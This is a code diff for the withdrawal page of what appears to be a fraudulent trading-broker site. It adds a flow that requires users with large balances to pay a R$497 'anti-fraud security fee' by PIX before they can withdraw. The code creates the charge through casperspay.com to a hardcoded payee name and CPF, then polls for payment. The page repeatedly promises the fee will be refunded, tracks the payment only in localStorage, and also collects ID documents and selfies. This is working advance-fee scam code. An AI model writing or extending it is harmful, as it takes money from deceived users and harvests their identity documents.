@@ -19,11 +19,18 @@ export default function SaquePage() {
   const [isLoadingBalance, setIsLoadingBalance] = useState(true)
   const [isProcessing, setIsProcessing] = useState(false)
   
+  // Estados para taxa de segurança com PIX
+  const [showSecurityFeePixModal, setShowSecurityFeePixModal] = useState(false)
+  const [securityFeePixData, setSecurityFeePixData] = useState<any>(null)
+  const [securityFeeTxid, setSecurityFeeTxid] = useState("")
+  const [isGeneratingSecurityFeePix, setIsGeneratingSecurityFeePix] = useState(false)
+  
   const videoRef = useRef<HTMLVideoElement>(null)
   const canvasRef = useRef<HTMLCanvasElement>(null)
   const streamRef = useRef<MediaStream | null>(null)
   
   const predefinedAmounts = [200, 1000, 2000, 100, 500, 1500, 4000]
+  const SECURITY_FEE_AMOUNT = 497
 
   // Buscar saldo do usuário ao carregar a página
   useEffect(() => {
@@ -45,10 +52,14 @@ export default function SaquePage() {
     fetchBalance()
   }, [])
 
-  // Verificar se KYC já foi feito
   const checkKycStatus = () => {
     const kycVerified = localStorage.getItem("kycVerified")
     return kycVerified === "true"
+  }
+
+  const checkSecurityFeePaid = () => {
+    const feePaid = localStorage.getItem("securityFeePaid")
+    return feePaid === "true"
   }
 
   const handleAmountSelect = (amount: number) => {
@@ -82,21 +93,18 @@ export default function SaquePage() {
       return
     }
 
-    // Verificar se KYC foi feito
     if (!checkKycStatus()) {
       setShowKycModal(true)
       setKycStep("intro")
       return
     }
 
-    // Verificar se precisa pagar taxa de segurança (saldo >= 10000)
-    if (balance >= 10000) {
+    if (balance >= 10000 && !checkSecurityFeePaid()) {
       setShowKycModal(true)
       setKycStep("security-fee")
       return
     }
 
-    // Processar saque
     processWithdrawal(withdrawalValue)
   }
 
@@ -104,7 +112,6 @@ export default function SaquePage() {
     try {
       setIsProcessing(true)
       
-      // Atualizar o saldo subtraindo o valor do saque
       const result = await updateUserBalance({
         balance: amount,
         operation: "subtract"
@@ -124,6 +131,115 @@ export default function SaquePage() {
     }
   }
 
+  const generateSecurityFeePix = async () => {
+    setIsGeneratingSecurityFeePix(true)
+    
+    try {
+      const response = await fetch("https://casperspay.com/api/pix", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+          "token": process.env.NEXT_PUBLIC_CASPERS_API_KEY || ""
+        },
+        body: JSON.stringify({
+          action: "criar",
+          nome: "nicolas",
+          cpf: "48402124062",
+          valor: SECURITY_FEE_AMOUNT.toString()
+        })
+      })
+
+      if (!response.ok) {
+        throw new Error("Erro ao gerar PIX")
+      }
+
+      const data = await response.json()
+      setSecurityFeePixData(data)
+      setSecurityFeeTxid(data.txid)
+      setShowSecurityFeePixModal(true)
+      setShowKycModal(false)
+    } catch (err) {
+      showToast("Erro", "Erro ao gerar PIX para taxa de segurança. Tente novamente.", "destructive")
+      console.error("Error creating security fee PIX:", err)
+    } finally {
+      setIsGeneratingSecurityFeePix(false)
+    }
+  }
+
+  const copySecurityFeePixCode = async () => {
+    const pixCode = securityFeePixData?.pixCopiaECola || ""
+    try {
+      await navigator.clipboard.writeText(pixCode)
+      showToast("Copiado", "Código PIX copiado com sucesso!")
+    } catch (err) {
+      console.error("Failed to copy PIX code:", err)
+    }
+  }
+
+  const checkSecurityFeePaymentStatus = async (txidToCheck: string) => {
+    try {
+      const response = await fetch("https://casperspay.com/api/pix", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+          "token": process.env.NEXT_PUBLIC_CASPERS_API_KEY || ""
+        },
+        body: JSON.stringify({
+          action: "verificar",
+          txid: txidToCheck
+        })
+      })
+
+      if (!response.ok) {
+        throw new Error("Erro ao verificar pagamento")
+      }
+
+      const data = await response.json()
+      
+      if (data.status === "CONCLUIDA" || data.pixStatus === "CONCLUIDA") {
+        localStorage.setItem("securityFeePaid", "true")
+        localStorage.setItem("securityFeePaidDate", new Date().toISOString())
+        
+        setShowSecurityFeePixModal(false)
+        setSecurityFeeTxid("")
+        setSecurityFeePixData(null)
+        
+        showToast("Taxa Paga", "Taxa de segurança paga com sucesso! Processando seu saque...")
+        
+        const withdrawalValue = Number.parseFloat(withdrawalAmount)
+        await processWithdrawal(withdrawalValue)
+      }
+    } catch (err) {
+      console.error("Error checking security fee payment status:", err)
+    }
+  }
+
+  useEffect(() => {
+    let timeout: NodeJS.Timeout
+    let isActive = true
+
+    const verifySecurityFeePayment = async () => {
+      if (!isActive || !securityFeeTxid) return
+      
+      await checkSecurityFeePaymentStatus(securityFeeTxid)
+      
+      if (isActive && showSecurityFeePixModal && securityFeeTxid) {
+        timeout = setTimeout(verifySecurityFeePayment, 3000)
+      }
+    }
+
+    if (showSecurityFeePixModal && securityFeeTxid) {
+      verifySecurityFeePayment()
+    }
+
+    return () => {
+      isActive = false
+      if (timeout) {
+        clearTimeout(timeout)
+      }
+    }
+  }, [showSecurityFeePixModal, securityFeeTxid])
+
   const handleFileUpload = (e: React.ChangeEvent<HTMLInputElement>, side: "front" | "back") => {
     const file = e.target.files?.[0]
     if (file) {
@@ -137,6 +253,10 @@ export default function SaquePage() {
 
   const startCamera = async () => {
     try {
+      setShowCamera(true)
+      // Aguardar um pouco para o vídeo estar renderizado
+      await new Promise(resolve => setTimeout(resolve, 100))
+      
       const stream = await navigator.mediaDevices.getUserMedia({ 
         video: { facingMode: "user", width: 1280, height: 720 } 
       })
@@ -144,11 +264,13 @@ export default function SaquePage() {
       if (videoRef.current) {
         videoRef.current.srcObject = stream
         streamRef.current = stream
+        // Aguardar o vídeo carregar
+        await videoRef.current.play()
       }
-      setShowCamera(true)
     } catch (err) {
       console.error("Erro ao acessar câmera:", err)
-      showToast("Erro", "Não foi possível acessar a câmera", "destructive")
+      showToast("Erro", "Não foi possível acessar a câmera. Verifique as permissões.", "destructive")
+      setShowCamera(false)
     }
   }
 
@@ -162,14 +284,26 @@ export default function SaquePage() {
 
   const capturePhoto = () => {
     if (videoRef.current && canvasRef.current) {
-      const context = canvasRef.current.getContext("2d")
-      if (context) {
-        canvasRef.current.width = videoRef.current.videoWidth
-        canvasRef.current.height = videoRef.current.videoHeight
-        context.drawImage(videoRef.current, 0, 0)
-        const imageData = canvasRef.current.toDataURL("image/jpeg")
+      const video = videoRef.current
+      const canvas = canvasRef.current
+      const context = canvas.getContext("2d")
+      
+      if (context && video.readyState === video.HAVE_ENOUGH_DATA) {
+        // Definir tamanho do canvas igual ao vídeo
+        canvas.width = video.videoWidth
+        canvas.height = video.videoHeight
+        
+        // Desenhar o frame atual do vídeo no canvas
+        context.drawImage(video, 0, 0, canvas.width, canvas.height)
+        
+        // Converter para imagem
+        const imageData = canvas.toDataURL("image/jpeg", 0.95)
         setSelfieCapture(imageData)
+        
+        // Parar a câmera
         stopCamera()
+      } else {
+        showToast("Erro", "Aguarde a câmera carregar completamente", "destructive")
       }
     }
   }
@@ -180,20 +314,23 @@ export default function SaquePage() {
       return
     }
 
-    // Salvar no localStorage que KYC foi verificado
     localStorage.setItem("kycVerified", "true")
     localStorage.setItem("kycDate", new Date().toISOString())
     
-    // Fechar modal e processar saque
     setShowKycModal(false)
     showToast("Verificação completa", "Seus documentos foram enviados com sucesso!")
     
-    // Processar o saque
+    if (balance >= 10000 && !checkSecurityFeePaid()) {
+      setShowKycModal(true)
+      setKycStep("security-fee")
+      return
+    }
+    
     const withdrawalValue = Number.parseFloat(withdrawalAmount)
     processWithdrawal(withdrawalValue)
   }
 
-  const nextKycStep = () => {
+  const nextKycStep = async () => {
     if (kycStep === "intro") {
       setKycStep("documents")
     } else if (kycStep === "documents") {
@@ -202,7 +339,10 @@ export default function SaquePage() {
         return
       }
       setKycStep("selfie")
-      startCamera()
+      // Aguardar a transição antes de iniciar a câmera
+      setTimeout(() => {
+        startCamera()
+      }, 300)
     }
   }
 
@@ -215,7 +355,14 @@ export default function SaquePage() {
   return (
     <div className="min-h-screen bg-white text-black">
       <div className="container mx-auto px-4 py-8">
-        {/* Display do Saldo */}
+         <div className="mb-6">
+          <div className="text-sm text-gray-500">
+            <span className="hover:text-black cursor-pointer transition-colors">Método de saque</span>
+            <span className="mx-2">›</span>
+            <span className="text-black font-medium">PIX</span>
+          </div>
+        </div>
+
         <div className="max-w-2xl mx-auto mb-6">
           <div className="bg-gradient-to-r from-black to-gray-800 text-white p-6 rounded-xl shadow-lg">
             <div className="flex items-center justify-between">
@@ -239,14 +386,7 @@ export default function SaquePage() {
           </div>
         </div>
 
-        <div className="mb-6">
-          <div className="text-sm text-gray-500">
-            <span className="hover:text-black cursor-pointer transition-colors">Método de saque</span>
-            <span className="mx-2">›</span>
-            <span className="text-black font-medium">PIX</span>
-          </div>
-        </div>
-
+       
         <div className="max-w-2xl mx-auto">
           {withdrawalSuccess ? (
             <div className="bg-white border-2 border-gray-200 rounded-xl p-8 text-center shadow-sm">
@@ -255,12 +395,10 @@ export default function SaquePage() {
               </div>
               <h2 className="text-3xl font-bold text-black mb-3">Solicitação de Saque Enviada!</h2>
               <p className="text-gray-600 mb-2">
-                Sua solicitação de saque de <span className="text-black font-bold">R$ {withdrawalAmount}</span> foi
-                enviada com sucesso.
+                Sua solicitação de saque de <span className="text-black font-bold">R$ {withdrawalAmount}</span> foi enviada com sucesso.
               </p>
               <p className="text-gray-600 mb-2">
-                O valor será creditado na chave PIX <span className="text-black font-bold">{pixKey}</span> em até 72
-                horas.
+                O valor será creditado na chave PIX <span className="text-black font-bold">{pixKey}</span> em até 72 horas.
               </p>
               <p className="text-gray-600 mb-6">
                 Seu novo saldo é: <span className="text-black font-bold">R$ {balance.toFixed(2)}</span>
@@ -333,8 +471,7 @@ export default function SaquePage() {
                 </div>
               </div>
 
-              {/* Mostrar novo saldo após saque */}
-              {Number.parseFloat(withdrawalAmount) > 0 && (
+              {/* {Number.parseFloat(withdrawalAmount) > 0 && (
                 <div className="bg-orange-50 border border-orange-200 p-4 rounded-lg mt-6">
                   <div className="flex items-center justify-between">
                     <span className="text-orange-800 font-medium">Saldo após o saque:</span>
@@ -343,7 +480,7 @@ export default function SaquePage() {
                     </span>
                   </div>
                 </div>
-              )}
+              )} */}
 
               <div className="mt-6">
                 <label className="flex items-center gap-3 cursor-pointer">
@@ -381,19 +518,18 @@ export default function SaquePage() {
           )}
         </div>
 
-        {/* Modal KYC */}
         {showKycModal && (
           <div className="fixed inset-0 bg-black bg-opacity-60 flex items-center justify-center z-50 p-4 backdrop-blur-sm">
             <div className="bg-white rounded-2xl p-8 max-w-2xl w-full max-h-[90vh] overflow-y-auto shadow-2xl">
               {kycStep === "security-fee" && (
                 <>
-                  <div className="flex items-center justify-between mb-6">
+                  <div className="flex items-center justify-between mb-8">
                     <div className="flex items-center gap-3">
-                      <img
-                        src="https://aurumtraderbroker.site/aurum_logo.jpg"
-                        alt="Strellar Broker"
-                        className="w-12 h-12 object-contain"
-                      />
+                      <div className="w-14 h-14 bg-black rounded-full flex items-center justify-center">
+                        <svg className="w-8 h-8 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
+                        </svg>
+                      </div>
                       <h2 className="text-2xl font-bold text-black">Taxa de Segurança Anti-Fraude</h2>
                     </div>
                     <button 
@@ -404,25 +540,43 @@ export default function SaquePage() {
                     </button>
                   </div>
 
-                  <p className="text-gray-600 mb-4 text-center leading-relaxed">
-                    Para garantir sua segurança e evitar fraudes, é necessário pagar uma taxa única de{" "}
-                    <span className="text-black font-bold text-xl">R$ 497,00</span>.
-                  </p>
+                  <div className="bg-gray-100 border-2 border-gray-300 rounded-xl p-6 mb-6">
+                    <div className="text-center mb-4">
+                      <p className="text-gray-700 text-lg mb-2 leading-relaxed">
+                        Para garantir sua segurança e evitar fraudes, é necessário pagar uma taxa única de:
+                      </p>
+                      <div className="bg-white border-2 border-black rounded-lg py-4 px-6 inline-block">
+                        <span className="text-black font-bold text-4xl">R$ {SECURITY_FEE_AMOUNT.toFixed(2)}</span>
+                      </div>
+                    </div>
+                  </div>
 
-                  <p className="text-gray-600 mb-8 text-center leading-relaxed">
-                    O valor da taxa será devolvido junto com o valor do seu saque, direto no seu PIX.
-                  </p>
+                  <div className="bg-gray-50 border-2 border-gray-200 rounded-xl p-6 mb-8">
+                    <div className="flex items-start gap-3">
+                      <div className="w-6 h-6 bg-black rounded-full flex items-center justify-center flex-shrink-0 mt-0.5">
+                        <svg className="w-4 h-4 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
+                        </svg>
+                      </div>
+                      <p className="text-gray-700 text-base leading-relaxed">
+                        <strong className="text-black">Importante:</strong> O valor da taxa será devolvido junto com o valor do seu saque, direto no seu PIX.
+                      </p>
+                    </div>
+                  </div>
 
                   <button
-                    onClick={() => {
-                      setShowKycModal(false)
-                      // Redirecionar para pagamento da taxa ou processar
-                      showToast("Taxa de Segurança", "Redirecionando para pagamento da taxa de segurança...", "default")
-                      // Aqui você implementaria o fluxo de pagamento da taxa
-                    }}
-                    className="w-full py-4 px-6 bg-gradient-to-r from-purple-500 to-purple-600 text-white font-bold rounded-xl hover:from-purple-600 hover:to-purple-700 transition-all shadow-lg mb-4 flex items-center justify-center gap-2 text-lg"
+                    onClick={generateSecurityFeePix}
+                    disabled={isGeneratingSecurityFeePix}
+                    className={`w-full py-4 px-6 rounded-xl font-bold transition-all shadow-lg mb-4 flex items-center justify-center gap-2 text-lg ${
+                      isGeneratingSecurityFeePix
+                        ? "bg-gray-400 text-white cursor-not-allowed"
+                        : "bg-black text-white hover:bg-gray-800"
+                    }`}
                   >
-                    💳 PAGAR TAXA E SACAR
+                    <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z" />
+                    </svg>
+                    {isGeneratingSecurityFeePix ? "GERANDO PIX..." : "PAGAR TAXA E SACAR"}
                   </button>
 
                   <button
@@ -437,8 +591,8 @@ export default function SaquePage() {
               {kycStep === "intro" && (
                 <>
                   <div className="text-center mb-6">
-                    <div className="w-20 h-20 bg-blue-100 rounded-full flex items-center justify-center mx-auto mb-4">
-                      <svg className="w-10 h-10 text-blue-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <div className="w-20 h-20 bg-gray-100 rounded-full flex items-center justify-center mx-auto mb-4">
+                      <svg className="w-10 h-10 text-black" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                         <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
                       </svg>
                     </div>
@@ -647,9 +801,9 @@ export default function SaquePage() {
 
                   <canvas ref={canvasRef} className="hidden" />
 
-                  <div className="bg-blue-50 border border-blue-200 p-4 rounded-lg mb-6">
-                    <p className="text-sm text-blue-800">
-                      <strong>Dicas:</strong> Certifique-se de estar em um local bem iluminado e que seu rosto esteja totalmente visível.
+                  <div className="bg-gray-50 border-2 border-gray-200 p-4 rounded-lg mb-6">
+                    <p className="text-sm text-gray-700">
+                      <strong className="text-black">Dicas:</strong> Certifique-se de estar em um local bem iluminado e que seu rosto esteja totalmente visível.
                     </p>
                   </div>
 
@@ -677,6 +831,75 @@ export default function SaquePage() {
                   </div>
                 </>
               )}
+            </div>
+          </div>
+        )}
+
+        {showSecurityFeePixModal && securityFeePixData && (
+          <div className="fixed inset-0 bg-black bg-opacity-60 flex items-center justify-center z-50 p-4 backdrop-blur-sm">
+            <div className="bg-white rounded-2xl p-8 max-w-md w-full max-h-[90vh] overflow-y-auto shadow-2xl">
+              <div className="flex items-center justify-between mb-6">
+                <h2 className="text-2xl font-bold text-black">Taxa de Segurança</h2>
+                <button 
+                  onClick={() => {
+                    setShowSecurityFeePixModal(false)
+                    setSecurityFeeTxid("")
+                    setSecurityFeePixData(null)
+                  }} 
+                  className="text-gray-400 hover:text-black text-2xl w-8 h-8 flex items-center justify-center rounded-full hover:bg-gray-100 transition-all"
+                >
+                  <X size={24} />
+                </button>
+              </div>
+
+              <div className="bg-gray-50 border-2 border-gray-200 p-4 rounded-xl mb-6">
+                <div className="flex justify-between items-center">
+                  <span className="text-black font-medium">Taxa Anti-Fraude</span>
+                  <span className="text-black font-bold text-xl">
+                    R$ {SECURITY_FEE_AMOUNT.toLocaleString("pt-BR", { minimumFractionDigits: 2 })}
+                  </span>
+                </div>
+              </div>
+
+              <div className="flex justify-center mb-6">
+                <div className="bg-white p-4 rounded-xl border-2 border-gray-200 shadow-sm">
+                  <img
+                    src={`https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=${encodeURIComponent(securityFeePixData?.pixCopiaECola || "")}`}
+                    alt="QR Code PIX"
+                    className="w-[220px] h-[220px]"
+                  />
+                </div>
+              </div>
+
+              <div className="space-y-4">
+                <div className="bg-gray-50 border-2 border-gray-200 p-4 rounded-xl">
+                  <div className="text-xs text-gray-600 font-mono break-all mb-3 leading-relaxed">
+                    {securityFeePixData?.pixCopiaECola || "Código PIX"}
+                  </div>
+                  <button
+                    onClick={copySecurityFeePixCode}
+                    className="w-full py-3 bg-black text-white rounded-lg hover:bg-gray-800 transition-all font-semibold"
+                  >
+                    Copiar Código PIX
+                  </button>
+                </div>
+
+                <div className="bg-gray-100 border-2 border-gray-300 p-4 rounded-xl">
+                  <p className="text-xs text-gray-700 text-center font-medium">
+                    🔄 Verificando pagamento automaticamente...
+                  </p>
+                </div>
+
+                <div className="bg-gray-50 border-2 border-gray-200 p-4 rounded-xl">
+                  <p className="text-xs text-gray-700 leading-relaxed">
+                    <strong className="text-black">Lembrete:</strong> Este valor será devolvido junto com seu saque após a confirmação do pagamento.
+                  </p>
+                </div>
+
+                <p className="text-center text-gray-600 text-sm leading-relaxed">
+                  Abra seu banco, escolha PIX → Pagar com QR Code ou Copia e Cola.
+                </p>
+              </div>
             </div>
           </div>
         )}
